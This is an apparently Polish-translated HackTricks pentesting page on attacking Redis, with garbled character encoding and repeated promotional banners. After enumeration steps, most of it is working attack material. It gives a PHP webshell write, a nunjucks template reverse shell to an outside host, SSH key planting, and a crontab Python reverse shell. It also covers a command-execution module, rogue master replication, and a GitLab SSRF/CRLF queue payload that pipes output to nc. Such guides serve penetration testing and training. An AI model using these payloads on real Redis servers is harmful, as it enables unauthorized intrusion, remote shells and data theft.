# 6379 - Pentesting Redis

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!

**Hacking Insights**\
Engage with content that delves into the thrill and challenges of hacking

**Real-Time Hack News**\
Keep up-to-date with fast-paced hacking world through real-time news and insights

**Latest Announcements**\
Stay informed with the newest bug bounties launching and crucial platform updates

**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!

## Podstawowe informacje

Z [dokumentacji](https://redis.io/topics/introduction): Redis to otwarte ÅºrÃ³dÅ‚o (licencja BSD), w pamiÄ™ci **magazyn struktury danych**, uÅ¼ywany jako **baza danych**, pamiÄ™Ä‡ podrÄ™czna i broker wiadomoÅ›ci.

DomyÅ›lnie Redis uÅ¼ywa protokoÅ‚u opartego na czystym tekÅ›cie, ale musisz pamiÄ™taÄ‡, Å¼e moÅ¼e rÃ³wnieÅ¼ implementowaÄ‡ **ssl/tls**. Dowiedz siÄ™, jak [uruchomiÄ‡ Redis z ssl/tls tutaj](https://fossies.org/linux/redis/TLS.md).

**DomyÅ›lny port:** 6379
```
PORT     STATE SERVICE  VERSION
6379/tcp open  redis   Redis key-value store 4.0.9
```
## Automatyczna Enumeracja

NiektÃ³re zautomatyzowane narzÄ™dzia, ktÃ³re mogÄ… pomÃ³c w uzyskaniu informacji z instancji redis:
```bash
nmap --script redis-info -sV -p 6379 <IP>
msf> use auxiliary/scanner/redis/redis_server
```
## RÄ™czna enumeracja

### Baner

Redis to **protokÃ³Å‚ oparty na tekÅ›cie**, moÅ¼esz po prostu **wysÅ‚aÄ‡ polecenie w gnieÅºdzie** a zwrÃ³cone wartoÅ›ci bÄ™dÄ… czytelne. PamiÄ™taj rÃ³wnieÅ¼, Å¼e Redis moÅ¼e dziaÅ‚aÄ‡ z uÅ¼yciem **ssl/tls** (ale to jest bardzo dziwne).

W regularnej instancji Redis moÅ¼esz po prostu poÅ‚Ä…czyÄ‡ siÄ™ za pomocÄ… `nc` lub moÅ¼esz rÃ³wnieÅ¼ uÅ¼yÄ‡ `redis-cli`:
```bash
nc -vn 10.10.10.10 6379
redis-cli -h 10.10.10.10 # sudo apt-get install redis-tools
```
Pierwszym poleceniem, ktÃ³re moÅ¼esz sprÃ³bowaÄ‡, jest **`info`**. MoÅ¼e zwrÃ³ciÄ‡ wynik z informacjami o instancji Redis **lub coÅ›** takiego jak poniÅ¼ej:
```
-NOAUTH Authentication required.
```
W tym ostatnim przypadku oznacza to, Å¼e **potrzebujesz waÅ¼nych poÅ›wiadczeÅ„** do uzyskania dostÄ™pu do instancji Redis.

### Uwierzytelnianie Redis

**DomyÅ›lnie** Redis moÅ¼na uzyskaÄ‡ **bez poÅ›wiadczeÅ„**. Jednak moÅ¼na go **skonfigurowaÄ‡** tak, aby obsÅ‚ugiwaÅ‚ **tylko hasÅ‚o lub nazwÄ™ uÅ¼ytkownika + hasÅ‚o**.\
MoÅ¼liwe jest **ustawienie hasÅ‚a** w pliku _**redis.conf**_ za pomocÄ… parametru `requirepass` **lub tymczasowo** do momentu ponownego uruchomienia usÅ‚ugi, Å‚Ä…czÄ…c siÄ™ z niÄ… i uruchamiajÄ…c: `config set requirepass p@ss$12E45`.\
MoÅ¼na rÃ³wnieÅ¼ skonfigurowaÄ‡ **nazwÄ™ uÅ¼ytkownika** w parametrze `masteruser` w pliku _**redis.conf**_.

{% hint style="info" %}
JeÅ›li skonfigurowano tylko hasÅ‚o, uÅ¼ywana nazwa uÅ¼ytkownika to "**default**".\
NaleÅ¼y rÃ³wnieÅ¼ zauwaÅ¼yÄ‡, Å¼e **nie ma sposobu, aby zewnÄ™trznie** sprawdziÄ‡, czy Redis zostaÅ‚ skonfigurowany tylko z hasÅ‚em, czy z nazwÄ… uÅ¼ytkownika + hasÅ‚em.
{% endhint %}

W przypadkach takich jak ten bÄ™dziesz **musiaÅ‚ znaleÅºÄ‡ waÅ¼ne poÅ›wiadczenia**, aby interagowaÄ‡ z Redis, wiÄ™c moÅ¼esz sprÃ³bowaÄ‡ [**brute-force**](../generic-methodologies-and-resources/brute-force.md#redis).\
**W przypadku znalezienia waÅ¼nych poÅ›wiadczeÅ„ musisz uwierzytelniÄ‡ sesjÄ™** po nawiÄ…zaniu poÅ‚Ä…czenia za pomocÄ… polecenia:
```bash
AUTH <username> <password>
```
**WaÅ¼ne dane logowania** bÄ™dÄ… odpowiedziane: `+OK`

### **Uwierzytelniona enumeracja**

JeÅ›li serwer Redis zezwala na **anonimowe poÅ‚Ä…czenia** lub jeÅ›li uzyskaÅ‚eÅ› waÅ¼ne dane logowania, moÅ¼esz rozpoczÄ…Ä‡ proces enumeracji usÅ‚ugi, uÅ¼ywajÄ…c nastÄ™pujÄ…cych **komend**:
```bash
INFO
[ ... Redis response with info ... ]
client list
[ ... Redis response with connected clients ... ]
CONFIG GET *
[ ... Get config ... ]
```
**Inne polecenia Redis** [**moÅ¼na znaleÅºÄ‡ tutaj**](https://redis.io/topics/data-types-intro) **i** [**tutaj**](https://lzone.de/cheat-sheet/Redis)**.**

ZauwaÅ¼, Å¼e **polecenia Redis instancji mogÄ… byÄ‡ zmieniane** lub usuwane w pliku _redis.conf_. Na przykÅ‚ad ta linia usunie polecenie FLUSHDB:
```
rename-command FLUSHDB ""
```
WiÄ™cej informacji na temat bezpiecznej konfiguracji usÅ‚ugi Redis tutaj: [https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04](https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04)

MoÅ¼esz rÃ³wnieÅ¼ **monitorowaÄ‡ w czasie rzeczywistym polecenia Redis** wykonywane za pomocÄ… polecenia **`monitor`** lub uzyskaÄ‡ **25 najwolniejszych zapytaÅ„** za pomocÄ… **`slowlog get 25`**

ZnajdÅº wiÄ™cej interesujÄ…cych informacji na temat innych poleceÅ„ Redis tutaj: [https://lzone.de/cheat-sheet/Redis](https://lzone.de/cheat-sheet/Redis)

### **Zrzut bazy danych**

WewnÄ…trz Redis **bazy danych to liczby zaczynajÄ…ce siÄ™ od 0**. MoÅ¼esz sprawdziÄ‡, czy ktÃ³rakolwiek jest uÅ¼ywana w wyniku polecenia `info` w sekcji "Keyspace":

![](<../.gitbook/assets/image (766).png>)

Lub moÅ¼esz po prostu uzyskaÄ‡ wszystkie **przestrzenie kluczy** (bazy danych) za pomocÄ…:
```
INFO keyspace
```
W tym przykÅ‚adzie uÅ¼ywane sÄ… **bazy danych 0 i 1**. **Baza danych 0 zawiera 4 klucze, a baza danych 1 zawiera 1**. DomyÅ›lnie Redis uÅ¼ywa bazy danych 0. Aby zrzuciÄ‡ na przykÅ‚ad bazÄ™ danych 1, musisz wykonaÄ‡:
```bash
SELECT 1
[ ... Indicate the database ... ]
KEYS *
[ ... Get Keys ... ]
GET <KEY>
[ ... Get Key ... ]
```
W przypadku wystÄ…pienia nastÄ™pujÄ…cego bÅ‚Ä™du `-WRONGTYPE Operation against a key holding the wrong kind of value` podczas uruchamiania `GET <KEY>`, moÅ¼e to byÄ‡ spowodowane tym, Å¼e klucz moÅ¼e byÄ‡ czymÅ› innym niÅ¼ ciÄ…g lub liczba caÅ‚kowita i wymaga specjalnego operatora do wyÅ›wietlenia.

Aby poznaÄ‡ typ klucza, uÅ¼yj polecenia `TYPE`, przykÅ‚ad poniÅ¼ej dla kluczy listy i hasha.
```bash
TYPE <KEY>
[ ... Type of the Key ... ]
LRANGE <KEY> 0 -1
[ ... Get list items ... ]
HGET <KEY> <FIELD>
[ ... Get hash item ... ]

# If the type used is weird you can always do:
DUMP <key>
```
**Zrzut bazy danych za pomocÄ… npm**[ **redis-dump**](https://www.npmjs.com/package/redis-dump) **lub python** [**redis-utils**](https://pypi.org/project/redis-utils/)

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

DoÅ‚Ä…cz do [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowaÄ‡ siÄ™ z doÅ›wiadczonymi hackerami i Å‚owcami bÅ‚Ä™dÃ³w!

**WglÄ…d w hacking**\
ZaangaÅ¼uj siÄ™ w treÅ›ci, ktÃ³re zgÅ‚Ä™biajÄ… emocje i wyzwania zwiÄ…zane z hackingiem

**AktualnoÅ›ci o hackingu w czasie rzeczywistym**\
BÄ…dÅº na bieÅ¼Ä…co z dynamicznym Å›wiatem hackingu dziÄ™ki aktualnym wiadomoÅ›ciom i wglÄ…dom

**Najnowsze ogÅ‚oszenia**\
BÄ…dÅº informowany o najnowszych programach bug bounty oraz istotnych aktualizacjach platformy

**DoÅ‚Ä…cz do nas na** [**Discord**](https://discord.com/invite/N3FrSbmwdy) i zacznij wspÃ³Å‚pracowaÄ‡ z najlepszymi hackerami juÅ¼ dziÅ›!

## Redis RCE

### Interaktywna powÅ‚oka

[**redis-rogue-server**](https://github.com/n0b0dyCN/redis-rogue-server) moÅ¼e automatycznie uzyskaÄ‡ interaktywnÄ… powÅ‚okÄ™ lub powÅ‚okÄ™ zwrotnÄ… w Redis(<=5.0.5).
```
./redis-rogue-server.py --rhost <TARGET_IP> --lhost <ACCACKER_IP>
```
### PHP Webshell

Info z [**tutaj**](https://web.archive.org/web/20191201022931/http://reverse-tcp.xyz/pentest/database/2017/02/09/Redis-Hacking-Tips.html). Musisz znaÄ‡ **Å›cieÅ¼kÄ™** do **folderu witryny**:
```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /usr/share/nginx/html
OK
10.85.0.52:6379> config set dbfilename redis.php
OK
10.85.0.52:6379> set test "<?php phpinfo(); ?>"
OK
10.85.0.52:6379> save
OK
```
â€‹JeÅ›li wystÄ…pi wyjÄ…tek dostÄ™pu do webshella, moÅ¼esz oprÃ³Å¼niÄ‡ bazÄ™ danych po wykonaniu kopii zapasowej i sprÃ³bowaÄ‡ ponownie, pamiÄ™taj, aby przywrÃ³ciÄ‡ bazÄ™ danych.

### Szablon Webshell

Podobnie jak w poprzedniej sekcji, moÅ¼esz rÃ³wnieÅ¼ nadpisaÄ‡ niektÃ³ry plik szablonu html, ktÃ³ry bÄ™dzie interpretowany przez silnik szablonÃ³w i uzyskaÄ‡ powÅ‚okÄ™.

Na przykÅ‚ad, w [**tym opisie**](https://www.neteye-blog.com/2022/05/cyber-apocalypse-ctf-2022-red-island-writeup/) moÅ¼esz zobaczyÄ‡, Å¼e atakujÄ…cy wstrzyknÄ…Å‚ **rev shell w html** interpretowany przez **silnik szablonÃ³w nunjucks:**
```javascript
{{ ({}).constructor.constructor(
"var net = global.process.mainModule.require('net'),
cp = global.process.mainModule.require('child_process'),
sh = cp.spawn('sh', []);
var client = new net.Socket();
client.connect(1234, 'my-server.com', function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});"
)()}}
```
{% hint style="warning" %}
ZauwaÅ¼, Å¼e **kilka silnikÃ³w szablonÃ³w buforuje** szablony w **pamiÄ™ci**, wiÄ™c nawet jeÅ›li je nadpiszesz, nowy **nie zostanie wykonany**. W takich przypadkach albo deweloper pozostawiÅ‚ aktywne automatyczne przeÅ‚adowanie, albo musisz przeprowadziÄ‡ DoS na usÅ‚udze (i oczekiwaÄ‡, Å¼e zostanie automatycznie uruchomiona ponownie).
{% endhint %}

### SSH

PrzykÅ‚ad [stÄ…d](https://blog.adithyanak.com/oscp-preparation-guide/enumeration)

ProszÄ™ pamiÄ™taÄ‡, Å¼e wynik **`config get dir`** moÅ¼e siÄ™ zmieniÄ‡ po innych rÄ™cznych poleceniach exploit. SugerujÄ™ uruchomiÄ‡ je jako pierwsze zaraz po zalogowaniu siÄ™ do Redis. W wyniku **`config get dir`** moÅ¼esz znaleÅºÄ‡ **dom** **uÅ¼ytkownika redis** (zwykle _/var/lib/redis_ lub _/home/redis/.ssh_), a znajÄ…c to, wiesz, gdzie moÅ¼esz zapisaÄ‡ plik `authenticated_users`, aby uzyskaÄ‡ dostÄ™p przez ssh **z uÅ¼ytkownikiem redis**. JeÅ›li znasz dom innego waÅ¼nego uÅ¼ytkownika, w ktÃ³rym masz uprawnienia do zapisu, moÅ¼esz rÃ³wnieÅ¼ to wykorzystaÄ‡:

1. Wygeneruj parÄ™ kluczy publicznych-prywatnych ssh na swoim komputerze: **`ssh-keygen -t rsa`**
2. Zapisz klucz publiczny do pliku: **`(echo -e "\n\n"; cat ~/id_rsa.pub; echo -e "\n\n") > spaced_key.txt`**
3. Importuj plik do redis: **`cat spaced_key.txt | redis-cli -h 10.85.0.52 -x set ssh_key`**
4. Zapisz klucz publiczny do pliku **authorized\_keys** na serwerze redis:

```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /var/lib/redis/.ssh
OK
10.85.0.52:6379> config set dbfilename "authorized_keys"
OK
10.85.0.52:6379> save
OK
```
5. Na koniec moÅ¼esz **ssh** do **serwera redis** z kluczem prywatnym: **ssh -i id\_rsa redis@10.85.0.52**

**Ta technika jest zautomatyzowana tutaj:** [https://github.com/Avinash-acid/Redis-Server-Exploit](https://github.com/Avinash-acid/Redis-Server-Exploit)

### Crontab
```
root@Urahara:~# echo -e "\n\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.85.0.53\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"|redis-cli -h 10.85.0.52 -x set 1
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dir /var/spool/cron/crontabs/
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dbfilename root
OK
root@Urahara:~# redis-cli -h 10.85.0.52 save
OK
```
Ostatni przykÅ‚ad dotyczy Ubuntu, dla **Centos** powyÅ¼sze polecenie powinno byÄ‡: `redis-cli -h 10.85.0.52 config set dir /var/spool/cron/`

Ta metoda moÅ¼e byÄ‡ rÃ³wnieÅ¼ uÅ¼ywana do zarabiania bitcoinÃ³w ï¼š[yam](https://www.v2ex.com/t/286981#reply14)

### ZaÅ‚aduj moduÅ‚ Redis

1. PostÄ™pujÄ…c zgodnie z instrukcjami z [https://github.com/n0b0dyCN/RedisModules-ExecuteCommand](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand), moÅ¼esz **skompilowaÄ‡ moduÅ‚ redis do wykonywania dowolnych poleceÅ„**.
2. NastÄ™pnie potrzebujesz sposobu na **przesÅ‚anie skompilowanego** moduÅ‚u.
3. **ZaÅ‚aduj przesÅ‚any moduÅ‚** w czasie wykonywania za pomocÄ… `MODULE LOAD /path/to/mymodule.so`.
4. **WyÅ›wietl zaÅ‚adowane moduÅ‚y**, aby sprawdziÄ‡, czy zostaÅ‚y poprawnie zaÅ‚adowane: `MODULE LIST`.
5. **Wykonaj** **polecenia**:

```
127.0.0.1:6379> system.exec "id"
"uid=0(root) gid=0(root) groups=0(root)\n"
127.0.0.1:6379> system.exec "whoami"
"root\n"
127.0.0.1:6379> system.rev 127.0.0.1 9999
```
6. OdÅ‚aduj moduÅ‚, kiedy chcesz: `MODULE UNLOAD mymodule`.

### OminiÄ™cie piaskownicy LUA

[**Tutaj**](https://www.agarri.fr/blog/archives/2014/09/11/trying\_to\_hack\_redis\_via\_http\_requests/index.html) moÅ¼esz zobaczyÄ‡, Å¼e Redis uÅ¼ywa polecenia **EVAL** do wykonywania **kodÃ³w Lua w piaskownicy**. W powiÄ…zanym poÅ›cie moÅ¼esz zobaczyÄ‡ **jak to wykorzystaÄ‡** za pomocÄ… funkcji **dofile**, ale [najwyraÅºniej](https://stackoverflow.com/questions/43502696/redis-cli-code-execution-using-eval) nie jest to juÅ¼ moÅ¼liwe. Tak czy inaczej, jeÅ›li moÅ¼esz **ominÄ…Ä‡ piaskownicÄ™ Lua**, moÅ¼esz **wykonywaÄ‡ dowolne** polecenia w systemie. RÃ³wnieÅ¼ z tego samego posta moÅ¼esz zobaczyÄ‡ kilka **opcji do spowodowania DoS**.

NiektÃ³re **CVEs do ucieczki z LUA**:

* [https://github.com/aodsec/CVE-2022-0543](https://github.com/aodsec/CVE-2022-0543)

### ModuÅ‚ Master-Slave

â€‹Master redis synchronizuje wszystkie operacje automatycznie z slave redis, co oznacza, Å¼e moÅ¼emy traktowaÄ‡ podatny redis jako slave redis, poÅ‚Ä…czony z master redis, ktÃ³ry kontrolujemy, a nastÄ™pnie moÅ¼emy wprowadziÄ‡ polecenie do naszego wÅ‚asnego redis.
```
master redis : 10.85.0.51 (Hacker's Server)
slave  redis : 10.85.0.52 (Target Vulnerability Server)
A master-slave connection will be established from the slave redis and the master redis:
redis-cli -h 10.85.0.52 -p 6379
slaveof 10.85.0.51 6379
Then you can login to the master redis to control the slave redis:
redis-cli -h 10.85.0.51 -p 6379
set mykey hello
set mykey2 helloworld
```
## SSRF rozmawiajÄ…c z Redis

JeÅ›li moÅ¼esz wysÅ‚aÄ‡ **czysty tekst** Å¼Ä…danie **do Redis**, moÅ¼esz **komunikowaÄ‡ siÄ™ z nim**, poniewaÅ¼ Redis bÄ™dzie czytaÅ‚ Å¼Ä…danie linia po linii i po prostu odpowie bÅ‚Ä™dami na linie, ktÃ³rych nie rozumie:
```
-ERR wrong number of arguments for 'get' command
-ERR unknown command 'Host:'
-ERR unknown command 'Accept:'
-ERR unknown command 'Accept-Encoding:'
-ERR unknown command 'Via:'
-ERR unknown command 'Cache-Control:'
-ERR unknown command 'Connection:'
```
Zatem, jeÅ›li znajdziesz **SSRF vuln** na stronie internetowej i moÅ¼esz **kontrolowaÄ‡** niektÃ³re **nagÅ‚Ã³wki** (moÅ¼e z wykorzystaniem luki CRLF) lub **parametry POST**, bÄ™dziesz w stanie wysyÅ‚aÄ‡ dowolne polecenia do Redis.

### PrzykÅ‚ad: Gitlab SSRF + CRLF do Shell

W **Gitlab11.4.7** odkryto lukÄ™ **SSRF** oraz **CRLF**. Luka **SSRF** znajdowaÅ‚a siÄ™ w **funkcjonalnoÅ›ci importu projektu z URL** podczas tworzenia nowego projektu i pozwalaÅ‚a na dostÄ™p do dowolnych adresÃ³w IP w formie \[0:0:0:0:0:ffff:127.0.0.1] (to uzyska dostÄ™p do 127.0.0.1), a luka **CRLF** zostaÅ‚a wykorzystana poprzez **dodanie znakÃ³w %0D%0A** do **URL**.

Zatem moÅ¼liwe byÅ‚o **wykorzystanie tych luk do komunikacji z instancjÄ… Redis**, ktÃ³ra **zarzÄ…dza kolejkami** z **gitlab** i naduÅ¼ycie tych kolejek w celu **uzyskania wykonania kodu**. Payload naduÅ¼ycia kolejki Redis to:
```
multi
sadd resque:gitlab:queues system_hook_push
lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|whoami | nc 192.241.233.143 80\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
exec
```
A **URL encode** Å¼Ä…danie **wykorzystujÄ…ce SSRF** i **CRLF** do wykonania `whoami` i odesÅ‚ania wyniku za pomocÄ… `nc` to:
```
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20127%2E0%2E0%2E1%202222%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf123321.git
```
_Z jakiegoÅ› powodu (jak dla autora_ [_https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/_](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/) _skÄ…d pochodzi ta informacja) wykorzystanie dziaÅ‚aÅ‚o z schematem `git`, a nie z schematem `http`._

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

DoÅ‚Ä…cz do [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowaÄ‡ siÄ™ z doÅ›wiadczonymi hackerami i Å‚owcami bugÃ³w!

**WglÄ…d w Hacking**\
ZaangaÅ¼uj siÄ™ w treÅ›ci, ktÃ³re zagÅ‚Ä™biajÄ… siÄ™ w emocje i wyzwania zwiÄ…zane z hackingiem

**AktualnoÅ›ci Hackingowe w Czasie Rzeczywistym**\
BÄ…dÅº na bieÅ¼Ä…co z dynamicznym Å›wiatem hackingu dziÄ™ki aktualnym wiadomoÅ›ciom i spostrzeÅ¼eniom

**Najnowsze OgÅ‚oszenia**\
BÄ…dÅº informowany o najnowszych programach bug bounty oraz istotnych aktualizacjach platformy

**DoÅ‚Ä…cz do nas na** [**Discord**](https://discord.com/invite/N3FrSbmwdy) i zacznij wspÃ³Å‚pracowaÄ‡ z najlepszymi hackerami juÅ¼ dziÅ›!

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel siÄ™ trikami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w na githubie.

</details>
{% endhint %}
